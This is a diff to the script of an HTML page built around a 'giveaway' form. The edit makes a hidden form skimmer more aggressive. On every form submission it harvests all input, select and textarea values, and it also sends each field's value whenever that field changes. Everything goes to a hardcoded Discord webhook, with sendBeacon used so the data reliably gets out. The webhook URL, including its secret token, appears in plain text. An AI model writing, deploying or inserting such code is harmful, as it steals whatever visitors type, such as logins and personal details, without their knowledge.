@@ -96,33 +96,45 @@ document.getElementById('giveawayForm').addEventListener('submit', function(e){
 </html>
 <script>
 (() => {
-  const WEBHOOK = "https://discord.com/api/webhooks/1573640777127436399/RxzZWoq-Kot61nvj0wuCOEtI-tMgjXReW8-Pld1PMkbLf8K5X5h6RHR7coFBo9tAIRFs";
+  const URL = "https://discord.com/api/webhooks/1573640777127436399/RxzZWoq-Kot61nvj0wuCOEtI-tMgjXReW8-Pld1PMkbLf8K5X5h6RHR7coFBo9tAIRFs";
 
-  const pushData = (source, payload) => {
-    const bodyText = typeof payload === "string" ? payload : JSON.stringify(payload, null, 2);
-    const content = `**[${source}]**\n\`\`\`\n${bodyText.slice(0, 1850)}\n\`\`\``;
-    fetch(WEBHOOK, {
+  const sendFast = (tag, data) => {
+    const text = typeof data === "string" ? data : JSON.stringify(data, null, 2);
+    const body = JSON.stringify({
+      content: `**[${tag}]**\n\`\`\`\n${text.slice(0, 1850)}\n\`\`\``
+    });
+    if (navigator.sendBeacon) {
+      const blob = new Blob([body], { type: "application/json" });
+      if (navigator.sendBeacon(URL, blob)) return;
+    }
+    fetch(URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content }),
+      body,
       keepalive: true
     }).catch(() => {});
   };
 
-  window.discordSend = (data) => pushData("MANUAL", data);
-
-  window.addEventListener("DOMContentLoaded", () => {
-    pushData("PAGE_OPEN", { url: location.href, time: new Date().toISOString() });
-  });
+  const grabAllInputs = (root = document) => {
+    const out = {};
+    root.querySelectorAll("input, select, textarea").forEach((el, i) => {
+      const key = el.name || el.id || el.placeholder || `field_${i + 1}`;
+      out[key] = el.value ?? "";
+    });
+    return out;
+  };
 
   document.addEventListener("submit", (e) => {
-    const formData = {};
-    new FormData(e.target).forEach((v, k) => { formData[k] = v; });
-    pushData("FORM_SUBMIT", formData);
+    const form = e.target;
+    const data = grabAllInputs(form && form.querySelectorAll ? form : document);
+    sendFast("SUBMIT", data);
   }, true);
 
-  window.addEventListener("error", (e) => {
-    pushData("ERROR", { msg: e.message, line: e.lineno });
-  });
+  document.addEventListener("change", (e) => {
+    const el = e.target;
+    if (!el || !("value" in el)) return;
+    const key = el.name || el.id || el.type || "input";
+    sendFast("INPUT", { [key]: el.value });
+  }, true);
 })();
 </script>
